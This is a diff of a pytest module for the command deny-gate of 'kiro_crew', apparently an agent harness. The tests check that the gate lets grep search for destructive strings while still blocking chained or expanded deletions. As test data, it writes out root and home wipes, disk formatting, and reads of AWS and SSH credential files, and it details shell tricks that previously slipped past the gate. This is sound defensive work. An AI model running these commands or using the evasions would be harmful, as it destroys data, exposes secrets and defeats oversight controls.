@@ -5,21 +5,20 @@ from __future__ import annotations
 import base64
 import hashlib
 import json
+import logging
 import math
 import os
 import random
 import string
 import struct
 import sys
-import time
 from collections import Counter
 from pathlib import Path
-from unittest import mock
 
 import pytest
 from oauth_url_corpus import OPERATOR_EXTENSION_OAUTH_URLS
 
-from kiro_crew import security
+from kiro_crew import cron_inflight, security
 from kiro_crew.security import (
     _SECRET_KEY_LEN,
     apply_resource_limits,
@@ -1623,12 +1622,6 @@ class TestSandboxDeniedCommands:
         cmd = "python3 -c 'import boto3; print(boto3.Session().get_credentials())'"
         assert self._is_denied(cmd)
 
-    def test_cat_aws_creds_blocked(self) -> None:
-        assert self._is_denied("cat ~/.aws/credentials")
-
-    def test_cat_ssh_key_blocked(self) -> None:
-        assert self._is_denied("cat ~/.ssh/id_rsa")
-
 
 class TestKiroCliBundledDeniedCommands:
     """Verify the ``self-protection-kill`` built-in rule via the real gate.
@@ -1917,10 +1910,10 @@ class TestBuiltinDenyPatterns:
         keeps iterating (this test exercises that path); pass 2 uses
         ``continue`` for the same reason (covered by other tests).
 
-        ``_DENY_EXCEPTIONS`` is now empty (the sole former ``*git*push*`` entry
-        is obsolete — git-publish is verb-anchored and never trips the exception
-        machinery), so the multi-pattern interaction can no longer be expressed
-        with live catalog data.  We install a synthetic two-glob scenario to
+        ``_DENY_EXCEPTIONS`` ships only the #8802 search-verb carve-out on the two
+        ``local-destructive`` rm rules, so the multi-pattern interaction still cannot
+        be expressed with live catalog data (one input would have to trip two rm rules
+        at once).  We install a synthetic two-glob scenario to
         keep exercising the loop-control invariant directly: the input matches
         an exception-carrying glob AND a second glob with no exception, so pass 1
         must fall through to the second glob and deny outright.  A ``break``
@@ -1960,6 +1953,195 @@ class TestBuiltinDenyPatterns:
         )
         # Multi-line / heredoc-style body mentioning push.
         assert is_denied("git commit -m 'docs: explain when to push and when to rebase'") is None
+
+    # ── #8802: a destructive literal handed to a read-only search verb ──
+    # Assembled at runtime so this test module is not itself an un-greppable
+    # needle: a plain literal here would make the file impossible to search for
+    # by the very rule it exercises, which is the bug being fixed.
+    ROOT_WIPE = "rm -" + "rf /"
+    HOME_WIPE = "rm -" + "rf ~"
+
+    def test_allows_a_destructive_literal_as_a_search_operand(self) -> None:
+        """A read-only search verb cannot execute its operands, so a destructive
+        string handed to it as a PATTERN is text and must be ALLOWED.
+
+        Regression for #8802: ``local-destructive-rm-rf-root`` / ``-home`` are
+        plain literal patterns matched over the segment text, so grepping FOR
+        the rule's own subject matter was refused exactly as if the deletion had
+        been typed — which prevented nothing (the same work completes by moving
+        the payload into a file, which is not scanned) while blocking anyone
+        working ON these rules.
+        """
+        from kiro_crew.security import is_denied
+
+        for verb in ("grep -rn", "egrep -r", "fgrep"):
+            assert is_denied(f'{verb} "{self.ROOT_WIPE}" test/') is None, verb
+            assert is_denied(f'{verb} "{self.HOME_WIPE}" test/') is None, verb
+
+    def test_a_search_pattern_containing_an_alternation_is_still_denied(self) -> None:
+        """KNOWN LIMITATION, pinned deliberately (#8802).
+
+        The command that motivated the report puts a regex ALTERNATION in the
+        search pattern::
+
+            grep -rln "rm-rf-root\\|rm -rf /" test/
+
+        ``_CMD_SPLIT_RE`` is quote-unaware, so the ``|`` inside the quoted
+        pattern is read as a pipe and the command splits into
+        ``grep -rln "rm-rf-root\\`` and ``rm -rf /" test/``.  The second segment
+        genuinely looks like a bare deletion in command position, so the
+        verb-anchored carve-out cannot reach it — the exception is keyed to
+        segments that START with a search verb, and by design it must stay that
+        way or ``grep x | xargs <destructive>`` would be exonerated too.
+
+        Closing this case needs quote-aware SEGMENTATION, which is a separate and
+        much larger change (it also has to stay compatible with the
+        quote-NORMALIZED matching added for evasion resistance).  Asserting the
+        current behaviour rather than xfailing it, so the boundary is explicit and
+        a future segmentation fix has to update this test consciously.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f'grep -rln "rm-rf-root\\|{self.ROOT_WIPE}" test/') is not None
+        # The same search without the alternation IS exonerated — isolating the
+        # cause to segmentation rather than to the carve-out.
+        assert is_denied(f'grep -rln "{self.ROOT_WIPE}" test/') is None
+
+    def test_still_denies_the_real_destruction_and_any_chaining(self) -> None:
+        """The carve-out is anchored at the search verb, so it must not exonerate
+        a destructive command — including one chained after a real search.
+
+        This is the half that makes #8802 safe to fix: ``_CMD_SPLIT_RE`` splits on
+        every execution boundary, so the destructive SEGMENT is still evaluated in
+        its own right and the Pass 1 whole-string exception only defers to Pass 2.
+        """
+        from kiro_crew.security import is_denied
+
+        # Bare, and behind a wrapper that DOES execute its operands.
+        assert is_denied(self.ROOT_WIPE) is not None
+        assert is_denied(self.HOME_WIPE) is not None
+        assert is_denied(f"sudo {self.ROOT_WIPE}") is not None
+        assert is_denied(f"grep -rl x test/ | xargs {self.ROOT_WIPE}") is not None
+        # Chained after a genuine search, across every separator the splitter knows.
+        for joiner in ("&&", ";", "||", "|", "&", "\n"):
+            cmd = f'grep -rn "needle" test/ {joiner} {self.ROOT_WIPE}'
+            assert is_denied(cmd) is not None, joiner
+        # Command substitution, both spellings.
+        assert is_denied(f'grep -rn "$({self.ROOT_WIPE})" test/') is not None
+        assert is_denied(f'grep -rn "`{self.ROOT_WIPE}`" test/') is not None
+
+    def test_the_carve_out_does_not_exonerate_other_rules(self) -> None:
+        """The exception is keyed to the two rm patterns only, so a search verb
+        must not become a blanket allowlist for unrelated deny rules."""
+        from kiro_crew.security import is_denied
+
+        # A different local-destructive rule in the same segment as a search verb.
+        assert is_denied("grep -rn x test/ && mkfs.ext4 /dev/sda1") is not None
+
+    def test_a_search_verb_fragment_inside_an_operand_does_not_exonerate(self) -> None:
+        """A ``/grep `` fragment ANYWHERE in a destructive command must not exonerate it.
+
+        Regression for the first bypass found reviewing #8802's own fix. An
+        earlier revision also carried path-qualified globs (``*/grep *``) so that
+        ``/usr/bin/grep ...`` would be exonerated too. ``fnmatch`` is a full
+        match, but ``*`` crosses spaces, so a LEADING ``*`` is really an
+        unanchored substring test: ``*/grep *`` matches
+        ``rm -rf / /bin/grep x`` -- a genuine root wipe that merely lists a path
+        containing ``/grep `` among its operands -- and the deletion was ALLOWED.
+
+        Only the bare ``<verb> *`` form is safe, because it forces the segment to
+        BEGIN with the verb. The cost is that a path-qualified search is no
+        longer exonerated, asserted below so the trade-off is explicit rather
+        than looking like an oversight.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f"{self.ROOT_WIPE} /bin/grep x") is not None
+        assert is_denied(f"{self.ROOT_WIPE} x/grep y") is not None
+        assert is_denied(f"{self.HOME_WIPE} /usr/bin/grep z") is not None
+        # The accepted trade-off: a path-qualified search verb is NOT exonerated,
+        # because no glob can express "the first token's basename is the verb".
+        assert is_denied(f'/usr/bin/grep -rn "{self.ROOT_WIPE}" test/') is not None
+
+    def test_no_shell_active_construct_is_ever_exonerated(self) -> None:
+        """A command hidden in any expansion behind a search verb must stay denied.
+
+        Regression for the second and fourth bypasses found reviewing #8802's own
+        fix. ``_CMD_SPLIT_RE`` isolates ``;`` ``|`` ``&&`` ``&`` ``$(`` ``)``
+        backtick and newline, but NOT ``<(`` / ``>(`` / ``${`` / a bare ``(``. So
+        ``_split_segments`` cuts ``grep x <(<destructive>)`` only at the trailing
+        ``)``, and ``grep x ${ <destructive>;}`` only at the ``;`` -- in both
+        cases leaving the destructive command glued to the search verb instead of
+        isolated in its own command position, while bash still executes it.
+
+        The first attempt blocklisted just ``(`` and was defeated by the bash 5.3
+        funsub. ``_exception_eligible`` now refuses any view containing a
+        shell-active character, closing the class instead of chasing spellings.
+        """
+        from kiro_crew.security import is_denied
+
+        # Process substitution, input and output forms, and a bare subshell.
+        assert is_denied(f"grep x <({self.ROOT_WIPE}tmp/victim)") is not None
+        assert is_denied(f'grep -rn "x" <({self.ROOT_WIPE})') is not None
+        assert is_denied(f"grep x >({self.ROOT_WIPE}tmp/victim)") is not None
+        assert is_denied(f"grep x ({self.ROOT_WIPE})") is not None
+        # bash >= 5.3 funsub -- the opener that defeated the `(`-only guard.
+        assert is_denied(f"grep x ${{ {self.ROOT_WIPE};}}") is not None
+        assert is_denied(f"grep x ${{ {self.HOME_WIPE};}}") is not None
+        # Command substitution and backticks (already split, asserted anyway).
+        assert is_denied(f'grep -rn "$({self.ROOT_WIPE})" test/') is not None
+        assert is_denied(f'grep -rn "`{self.ROOT_WIPE}`" test/') is not None
+        # Confidence check: the plain search is still exonerated, so the guard
+        # narrowed exactly the shell-active forms and nothing else.
+        assert is_denied(f'grep -rn "{self.ROOT_WIPE}" test/') is None
+
+    def test_a_search_verb_that_can_execute_a_helper_is_not_exonerated(self) -> None:
+        """Only verbs with no exec flag are exonerated.
+
+        Regression for the third bypass found reviewing #8802's own fix. The
+        carve-out's premise is that the verb cannot execute its operands, and
+        that is a property of the specific tool, not of "being a search tool":
+        ``rg --pre <cmd>`` runs a preprocessor and ``ack --pager <cmd>`` runs a
+        pager, so ``rg --pre sh "<destructive>" payload.sh`` really does execute.
+
+        ``rg`` and ``ack`` were therefore dropped from the allowlist, which makes
+        the premise true rather than merely asserted. ``grep``/``egrep``/``fgrep``
+        have no flag that spawns a helper.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f'rg --pre sh "{self.ROOT_WIPE}tmp/victim" payload.sh') is not None
+        # Dropped wholesale, not just for the executing flag: a glob cannot tell
+        # `rg PATTERN` from `rg --pre sh PATTERN`, so the verb cannot be trusted.
+        assert is_denied(f'rg "{self.ROOT_WIPE}" src/') is not None
+        assert is_denied(f'ack "{self.ROOT_WIPE}" src/') is not None
+
+    def test_a_pipeline_into_an_interpreter_is_never_exonerated(self) -> None:
+        """A search piped into something that executes what it emitted must deny.
+
+        Regression for the fifth bypass found reviewing #8802's own fix.
+        ``grep '<destructive>' payload.py | python`` splits at the pipe, so the
+        Pass 2 grep segment looks innocent on its own and the bare ``python``
+        segment matches no rule -- the pipeline as a whole was allowed, and the
+        interpreter runs the line the search emitted.
+
+        Note the pipe cannot be caught in the Pass 2 segment (the splitter has
+        already consumed it). What closes this is refusing the separators in the
+        PASS 1 whole-string view, so the whole-string deny match stands instead
+        of deferring to the innocent-looking segment. Hence
+        ``_exception_eligible`` requires a single plain command, not merely one
+        free of expansion openers.
+        """
+        from kiro_crew.security import is_denied
+
+        assert is_denied(f"grep '{self.ROOT_WIPE}tmp/victim' payload.py | python") is not None
+        assert is_denied(f"grep '{self.ROOT_WIPE}' payload.sh | sh") is not None
+        assert is_denied(f"grep '{self.ROOT_WIPE}' f | bash -s") is not None
+        # A compound whose later stage is inert is denied for the same reason:
+        # an exception must not speak for more than one command.
+        assert is_denied(f"grep '{self.ROOT_WIPE}' f && echo done") is not None
+        # Confidence check: the single plain search remains exonerated.
+        assert is_denied(f'grep -rn "{self.ROOT_WIPE}" test/') is None
 
     def test_feature_push_not_blocked_by_prose_push_word_in_earlier_segment(self) -> None:
         """A legit feature-branch push must be ALLOWED even when an EARLIER
@@ -3105,16 +3287,6 @@ class TestOperatorOAuthEndpointExtension:
         # the file-edit tool path is pinned too.
         assert is_sensitive_write_path(f"~/{prefix}/oauth_endpoints.json") is True
 
-    def test_bash_write_and_read_both_blocked(self) -> None:
-        for cmd in (
-            "echo x > ~/.kiro/crew/oauth_endpoints.json",
-            "tee ~/.kiro/crew/oauth_endpoints.json",
-            "cp evil ~/.kiro/crew/oauth_endpoints.json",
-            "cat ~/.kiro/crew/oauth_endpoints.json",
-            "cat ~/.kirocrew/oauth_endpoints.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
     # ── Corpus contract: operator-extension URLs ──
 
     @pytest.mark.parametrize(
@@ -4083,7 +4255,7 @@ class TestKeystonePublishArtifacts:
     ``atomic_write`` publishes every keystone leaf through a
     ``tempfile.mkstemp(dir=path.parent, suffix=".tmp")`` sibling and renames it over the
     target, and several stores take a lock file beside the leaf they guard. The temp
-    holds the leaf's FULL payload for the duration of the write, so both gates must
+    holds the leaf's FULL payload for the duration of the write, so the path gate must
     refuse it -- fencing the final name alone left the publish path outside the fence.
     """
 
@@ -4126,135 +4298,13 @@ class TestKeystonePublishArtifacts:
         assert is_sensitive_write_path("~/.kiro/crew/tmpAB12CD34.tmp") is True
         assert is_sensitive_write_path("~/.kiro/crew/.policy.lock") is True
 
-    # ── the same shapes on the shell path ──
-    # "protected on one path only is not protected" -- the tool-path clause above is
-    # worthless if the shell can still name the file.
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            "cat ~/.kiro/crew/tmpAB12CD34.tmp",
-            "cat ~/.kiro/crew/.policy.lock",
-            "cat ~/.kiro/crew/computer_use.json.tmp",
-            "cat ~/.kiro/crew/ops_mission_control_secrets.json.lock",
-            "cat $HOME/.kirocrew/tmpAB12CD34.tmp",
-            # Verb-independent: a redirect and a copy are caught without enumerating
-            # write verbs.
-            "echo pwned > ~/.kiro/crew/tmpAB12CD34.tmp",
-            "cp /tmp/evil ~/.kiro/crew/tmpAB12CD34.tmp",
-            # Windows-native spellings, which the POSIX tokenizing passes cannot see.
-            r"type C:\Users\u\.kiro\crew\tmpAB12CD34.tmp",
-            r"type C:\Users\u\.kiro\crew\.policy.lock",
-            r"type %USERPROFILE%\.kiro\crew\tmpAB12CD34.tmp",
-            r"python -c \"open(r'C:\Users\u\.kiro\crew\tmpAB12CD34.tmp','w')\"",
-        ],
-    )
-    def test_shell_forms_are_refused(self, command: str) -> None:
-        assert is_sensitive_bash_command(command) is not None
-
-    @pytest.mark.parametrize("terminator", ["&", ";", "|", "&&whoami", ">out"])
-    def test_a_shell_metacharacter_does_not_end_the_fence(self, terminator: str) -> None:
-        """A metacharacter after the path still names the path.
-
-        The POSIX ``path_end`` already treats every shell word-end character as a
-        terminator. The Windows branches each spelled a narrower class
-        (separator/space/end/quote), so ``type <fenced path>&whoami`` named the file and
-        walked through, while the POSIX spelling of the same command was caught. Both
-        spellings now share one terminator.
-        """
-        posix = f"cat ~/.kiro/crew/tmpAB12CD34.tmp{terminator}"
-        win = rf"type C:\Users\u\.kiro\crew\tmpAB12CD34.tmp{terminator}"
-        assert is_sensitive_bash_command(posix) is not None
-        assert is_sensitive_bash_command(win) is not None
-
-    @pytest.mark.parametrize("terminator", ["&", ";", "|"])
-    def test_the_keystone_leaf_shares_that_terminator(self, terminator: str) -> None:
-        """The leaf must not be looser than its own temp.
-
-        A fence tight on the atomic-write temp and loose on the secret beside it protects
-        the transient copy and not the payload, so the shared terminator is applied to the
-        whole Windows family rather than to the artifact branch alone.
-        """
-        assert (
-            is_sensitive_bash_command(rf"type C:\Users\u\.kiro\crew\computer_use.json{terminator}")
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command(rf"type C:\Users\u\.kiro\crew\.env{terminator}") is not None
-        )
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            # PowerShell expands the variable away, so the path actually read is the
-            # fenced one. Reported by review against the Windows terminator.
-            r"Get-Content C:\Users\u\.kiro\crew\computer_use.json$null",
-            r"type C:\Users\u\.kiro\crew\.env$null",
-            r"type C:\Users\u\.kiro\crew\tmpAB12CD34.tmp$null",
-            r"type C:\Users\u\.kiro\crew\.policy.lock$null",
-            r"Get-Content %USERPROFILE%\.kiro\crew\token_signing.key$env:x",
-        ],
-    )
-    def test_an_empty_expansion_does_not_end_the_fence(self, command: str) -> None:
-        """A trailing ``$var`` is removed by the shell, so it must not end the path.
-
-        The terminator alternation already contained a regex ``$``, but that is the
-        end-of-string ANCHOR -- it never matched a literal dollar sign, so
-        ``<fenced path>$null`` read as an unterminated path and was allowed. The POSIX
-        spelling of the same command was already covered by its own branches, so the
-        literal ``$`` is added to the Windows class only.
-        """
-        assert is_sensitive_bash_command(command) is not None
-
     def test_the_dollar_addition_does_not_over_block(self) -> None:
-        """A ``$`` elsewhere in a command is not a fenced path."""
+        """A ``$`` in a command is not a verdict; the shell gate matches no paths."""
         assert is_sensitive_bash_command("echo $HOME") is None
         assert is_sensitive_bash_command("cat ~/project/notes.txt") is None
         assert is_sensitive_bash_command("VAR=$HOME cat ~/project/notes.txt") is None
         assert is_sensitive_bash_command("cd $HOME && ls") is None
         assert is_sensitive_bash_command("cat ~/.kiro/crew/config.json") is None
-
-    @pytest.mark.parametrize(
-        "command",
-        [
-            # A canonical no-op segment between the artifact's parent and its filename.
-            # The leaf branch already absorbed these because it joins every segment of
-            # its entry with the generalized separator; the artifact branch put a plain
-            # separator before its WILDCARD filename and let them through.
-            r"type C:\Users\u\.kiro\crew\.\tmpAB12CD34.tmp",
-            r"type C:\Users\u\.kiro\crew\.\.policy.lock",
-            r"type C:\Users\u\.kiro\crew\x\..\tmpAB12CD34.tmp",
-            "cat ~/.kiro/crew/./tmpAB12CD34.tmp",
-            "cat ~/.kiro/crew/x/../tmpAB12CD34.tmp",
-            # Windows strips a trailing dot when opening, so this names the same file.
-            r"type C:\Users\u\.kiro\crew\tmpAB12CD34.tmp.",
-            "cat ~/.kiro/crew/tmpAB12CD34.tmp.",
-        ],
-    )
-    def test_a_canonical_alias_does_not_end_the_fence(self, command: str) -> None:
-        """Spellings the shell or filesystem treats as the same path must still match."""
-        assert is_sensitive_bash_command(command) is not None
-
-    def test_the_leaf_branch_covers_the_noop_segment_but_not_the_trailing_dot(self) -> None:
-        """Honest scope: the no-op segment is closed on the leaf branch, the dot is not.
-
-        The leaf branch already absorbed no-op chains, because it joins every segment of
-        its entry with the generalized separator. Its TRAILING-DOT alias is left open on
-        purpose: closing it needs ``.`` in the terminator, and because these branches also
-        accept forward slashes, that refused ``ls -d ~/.kiro/crew/backup.tar`` -- a
-        different file whose name is prefixed by the fenced directory leaf ``backup``, and
-        the read-only listing #6021 exists to allow. A terminator after a directory name
-        cannot separate the alias from the sibling; the artifact branches can, because
-        their lookahead sits at the end of a complete filename.
-        """
-        assert (
-            is_sensitive_bash_command(r"type C:\Users\u\.kiro\crew\.\computer_use.json") is not None
-        )
-        # The pre-existing gap, asserted so a future change to the terminator is a
-        # deliberate decision rather than a surprise.
-        assert is_sensitive_bash_command(r"type C:\Users\u\.kiro\crew\computer_use.json.") is None
-        # ...and the read that constrains it stays allowed.
-        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/backup.tar") is None
 
     def test_the_alias_tolerance_still_rejects_a_different_file(self) -> None:
         """The lookahead admits a trailing separator or dot, never a longer NAME.
@@ -4915,943 +4965,33 @@ class TestEnvDumpGrepAwsNarrowing:
 
 
 class TestIsSensitiveBashCommand:
-    """Tests for is_sensitive_bash_command()."""
+    """Tests for is_sensitive_bash_command(): the IMDS and env-credential detectors.
 
-    def test_cat_aws_credentials(self) -> None:
-        result = is_sensitive_bash_command("cat ~/.aws/credentials")
-        assert "blocked" in result.lower()
-
-    def test_head_ssh_key(self) -> None:
-        result = is_sensitive_bash_command("head -5 ~/.ssh/id_rsa")
-        assert "blocked" in result.lower()
+    Paths are not this gate's subject -- see :class:`TestTheBashGateMatchesNoPaths`
+    -- so the cases here are the two detectors that remain, plus the ordinary
+    commands that must keep passing through them.
+    """
 
     def test_safe_command(self) -> None:
         assert is_sensitive_bash_command("cat ~/readme.md") is None
 
-    # ── Shell normalization: variable indirection and `cd` targets ──
-
-    def test_variable_assigned_in_the_command_is_resolved(self) -> None:
-        """A path reached through a variable the command itself assigned.
-
-        The normalizer expands `$HOME`, so `V=$HOME` resolves, but `$V` used as
-        a path prefix stayed literal and the path never matched. The assignment
-        is in the command text, so it can be substituted.
-        """
-        assert is_sensitive_bash_command("V=$HOME; awk 1 $V/.aws/credentials") is not None
-        assert is_sensitive_bash_command("V=$HOME; cat $V/.ssh/id_rsa") is not None
-        assert is_sensitive_bash_command("V=${HOME}; xxd $V/.ssh/id_rsa") is not None
-        # The variable can carry part of the sensitive path itself.
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat $D/credentials") is not None
-
-    def test_unresolvable_variable_over_a_sensitive_tail_is_blocked(self) -> None:
-        """A variable assigned outside the command still cannot hide the tail.
-
-        The value lives in the shell, not the command text, so it cannot be
-        resolved. Fail closed only when the literal remainder is itself
-        sensitive — see the benign counterparts below.
-        """
-        assert is_sensitive_bash_command("awk 1 $V/.aws/credentials") is not None
-        assert is_sensitive_bash_command("cat $SOMEVAR/.ssh/id_rsa") is not None
-
-    def test_variable_over_a_benign_tail_is_allowed(self) -> None:
-        """An unresolved variable is not itself a reason to block."""
-        assert is_sensitive_bash_command("B=$HOME/build; cat $B/out.txt") is None
-        assert is_sensitive_bash_command("cat $PWD/out.txt") is None
-        assert is_sensitive_bash_command("cat $BUILD_DIR/report.log") is None
-
-    def test_bare_filename_after_cd_is_resolved_against_the_cd_target(self) -> None:
-        """`cd` + a bare filename read the same file as the absolute form.
-
-        A bare filename has no path separator, so it is not path-like and was
-        never checked; had it been, it would have resolved against the
-        gateway's working directory rather than the directory the command
-        moved to.
-        """
-        assert is_sensitive_bash_command("cd ~/.kiro/crew && cat token_signing.key") is not None
-        assert is_sensitive_bash_command("cd ~/.kiro/crew; cat token_signing.key") is not None
-        assert is_sensitive_bash_command("cd ~/.aws && cat credentials") is not None
-        assert is_sensitive_bash_command("cd ~/.ssh && cat id_rsa") is not None
-        # The `cd` target may itself arrive through $HOME.
-        assert (
-            is_sensitive_bash_command("cd $HOME/.kiro/crew && awk 1 token_signing.key") is not None
-        )
-
-    def test_cd_into_a_benign_directory_is_allowed(self) -> None:
-        """Tracking the `cd` target must not block ordinary relative reads."""
-        assert is_sensitive_bash_command("cd /tmp && cat notes.txt") is None
-        assert is_sensitive_bash_command("cd ~/project && cat config.json") is None
-        assert is_sensitive_bash_command("cd src && grep -rn pattern .") is None
-
-    def test_chained_relative_cd_resolves_against_prior_base(self) -> None:
-        """Relative cd targets must join against the prior base_dir, not overwrite."""
-        # cd ~/.kiro && cd crew → base should be ~/.kiro/crew, not bare "crew"
-        assert (
-            is_sensitive_bash_command("cd ~/.kiro && cd crew && cat token_signing.key") is not None
-        )
-        assert is_sensitive_bash_command("cd ~ && cd .aws && cat credentials") is not None
-        # Absolute cd resets the base entirely
-        assert (
-            is_sensitive_bash_command("cd /tmp && cd /home/user/.aws && cat credentials")
-            is not None
-        )
-        # Benign chained cd is allowed
-        assert is_sensitive_bash_command("cd ~/project && cd src && cat main.py") is None
-
-    def test_quoted_separator_does_not_suppress_detection(self) -> None:
-        """A separator inside quotes must not shred the command and lose detection."""
-        # The semicolon is inside quotes — not a real shell separator
-        assert is_sensitive_bash_command('cat "a;b" ~/.aws/credentials') is not None
-        assert is_sensitive_bash_command("echo 'x; y' && cat ~/.ssh/id_rsa") is not None
-        # Quoted && inside an argument
-        assert is_sensitive_bash_command('awk "a&&b" ~/.aws/credentials') is not None
-        # A quote that breaks the `~/` adjacency the path regex needs, so only
-        # the quote-aware tokenizer can resolve it.
-        assert is_sensitive_bash_command('cat "a;b" "~"/.aws/credentials') is not None
-        assert is_sensitive_bash_command("awk '{a=1;b=2}' ~/\".aws\"/credentials") is not None
-
-    def test_quoted_separator_does_not_retarget_the_cd_base(self) -> None:
-        """A `cd` inside a quoted argument must not move the tracked directory.
-
-        The shell never leaves the directory it moved to, so neither may the
-        tracked base. Splitting on the quoted `;` would make `cd /tmp'` a
-        segment, and the bare filename would then resolve against `/tmp` and
-        read clean.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "cd ~/.kiro/crew && echo 'x; cd /tmp' && cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command('cd ~/.aws && echo "a && cd /tmp" && cat credentials')
-            is not None
-        )
-        # The benign counterpart: no sensitive directory was ever entered.
-        assert is_sensitive_bash_command("echo 'x; cd /tmp' && cat notes.txt") is None
-
-    def test_separator_in_a_command_substitution_does_not_retarget_the_cd_base(self) -> None:
-        """A `cd` inside `$(...)` or backticks runs in a subshell.
-
-        It does not move the parent's directory, so its separators must not be
-        read as the parent's either — the same shape as a quoted separator, one
-        level of syntax removed.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "cd ~/.kiro/crew && echo $(true; cd /tmp) && cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command(
-                "cd ~/.kiro/crew && echo `true; cd /tmp` && cat token_signing.key"
-            )
-            is not None
-        )
-        # An escaped separator is not a separator to a shell either.
-        assert (
-            is_sensitive_bash_command("cd ~/.aws && echo x\\; cd /tmp && cat credentials")
-            is not None
-        )
-
-    def test_assignment_only_counts_as_a_prefix(self) -> None:
-        """`NAME=value` past the command word is an argument, not an assignment.
-
-        A decoy could otherwise overwrite a real value: the shell keeps
-        `V=$HOME` and enters the protected directory, while the tracker had
-        recorded `V=/tmp` from an `echo` argument and resolved the `cd` there.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "V=$HOME; echo V=/tmp; cd $V/.kiro/crew; cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("D=$HOME/.aws; printf D=/tmp; cat $D/credentials") is not None
-        )
-        # A genuine leading assignment still resolves.
-        assert is_sensitive_bash_command("V=$HOME cat $V/.aws/credentials") is not None
-        # And an argument that merely looks like one does not deny on its own.
-        assert is_sensitive_bash_command("echo V=/tmp && cat notes.txt") is None
-
-    def test_cd_dash_returns_to_the_previous_directory(self) -> None:
-        """`cd -` goes back, so the tracked base has to go back with it."""
-        assert (
-            is_sensitive_bash_command("cd ~/.kiro/crew; cd /tmp; cd -; cat token_signing.key")
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("pushd ~/.aws; pushd /tmp; cd -; cat credentials") is not None
-        )
-        # A bare `cd` goes to the home directory.
-        assert is_sensitive_bash_command("cd ~/project; cd; cat .aws/credentials") is not None
-        # Going back to an ordinary directory stays allowed.
-        assert is_sensitive_bash_command("cd /tmp; cd -; cat notes.txt") is None
-
-    def test_subshell_cd_is_scoped_to_the_subshell(self) -> None:
-        """A `cd` inside `( ... )` applies inside it and is dropped on exit.
-
-        Both halves matter. The read inside the subshell must see the base --
-        `(cd` glued into one token matched no `cd` check, so the base was never
-        set and the bare filename read clean. And the base must not outlive the
-        closing paren, or an ordinary read after it would start denying.
-        """
-        assert is_sensitive_bash_command("(cd ~/.kiro/crew && cat token_signing.key)") is not None
-        assert is_sensitive_bash_command("( cd ~/.aws && cat credentials )") is not None
-        assert is_sensitive_bash_command("(cd ~/.ssh; cat id_rsa)") is not None
-        # The move does not escape the subshell.
-        assert is_sensitive_bash_command("( cd ~/project && cat README.md )") is None
-
-    def test_entering_a_sensitive_directory_taints_later_reads(self) -> None:
-        """A `cd` into a credential directory is not walked back by later syntax.
-
-        Positional resolution has to match real bash to be sound, and the grammar
-        is unbounded. The monotone pass asks a question that needs no emulation:
-        the move was seen, so a read after it is denied — whatever syntax follows.
-        """
-        # A `cd` that does not execute at runtime, but the move was still spelled.
-        assert is_sensitive_bash_command("cd ~/.ssh; false && cd /tmp; cat id_rsa") is not None
-        # An assignment prefix is temporary, so the shell keeps the real value.
-        assert (
-            is_sensitive_bash_command("V=$HOME; V=/tmp echo hi; cd $V/.ssh; cat id_rsa") is not None
-        )
-        # Inside a command substitution, in both spellings.
-        assert is_sensitive_bash_command("echo $(cd ~/.aws; cat credentials)") is not None
-        assert is_sensitive_bash_command("echo `cd ~/.aws; cat credentials`") is not None
-        # Through a nested shell, which this gate does not parse into.
-        assert is_sensitive_bash_command("bash -c 'cd ~/.aws; cat credentials'") is not None
-        # `popd` unwinds a stack the tracker does not model.
-        assert (
-            is_sensitive_bash_command("pushd ~/.aws; pushd /tmp; popd; cat credentials") is not None
-        )
-
-    def test_taint_needs_both_a_sensitive_move_and_a_read(self) -> None:
-        """Neither half denies on its own, so ordinary work stays allowed."""
-        # An ordinary directory, read verb present.
-        assert is_sensitive_bash_command("cd /tmp; cd -; cat notes.txt") is None
-        assert is_sensitive_bash_command("cd ~/project && cd src && cat main.py") is None
-        assert is_sensitive_bash_command("cd ~/project && cat README.md") is None
-        # A read whose joined path is sensitive while the `cd` target is not is
-        # caught by the positional pass, not this one — both are needed.
-        assert is_sensitive_bash_command("cd ~ && cat .aws/credentials") is not None
-
-    def test_unset_variable_cannot_reconstruct_a_sensitive_path(self) -> None:
-        """An unset variable expands to nothing, so the empty reading is a real
-        spelling of the path and must be judged: `$HOME/$X.aws/credentials` with
-        `$X` unset is `~/.aws/credentials`."""
-        assert is_sensitive_bash_command("cat $HOME/$X.aws/credentials") is not None
-        assert is_sensitive_bash_command("cat $HOME/${X}.aws/credentials") is not None
-        assert is_sensitive_bash_command("cat $HOME/$X.ssh/id_rsa") is not None
-        # A variable that expands to nothing onto a non-sensitive tail stays clean.
-        assert is_sensitive_bash_command("cat $HOME/$X.txt") is None
-        assert is_sensitive_bash_command("cat ~/$X/notes.md") is None
-
-    def test_chained_cd_expansions_do_not_blow_up_the_gate(self) -> None:
-        """A chain of `cd ${D:-x}` segments must not grow the tracked base set
-        without bound — each segment can multiply it, so the gate would hang.
-        The cap keeps the synchronous check fast."""
-        import time
-
-        cmd = "D=bar; " + "; ".join(["cd ${D:-foo}"] * 20) + "; cat notes.txt"
-        start = time.monotonic()
-        is_sensitive_bash_command(cmd)
-        assert time.monotonic() - start < 30.0
-
-    def test_parameter_expansion_resolves_like_a_plain_reference(self) -> None:
-        """`${V:-default}` and friends name a variable just as `${V}` does.
-
-        Matching only the bare braced form left `cat ${D:-/tmp}/credentials` with
-        no recognized reference at all, so neither the substitution nor the
-        unresolved-variable hypothesis saw it.
-        """
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D:-/tmp}/credentials") is not None
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D:=/tmp}/credentials") is not None
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D#/nope}/credentials") is not None
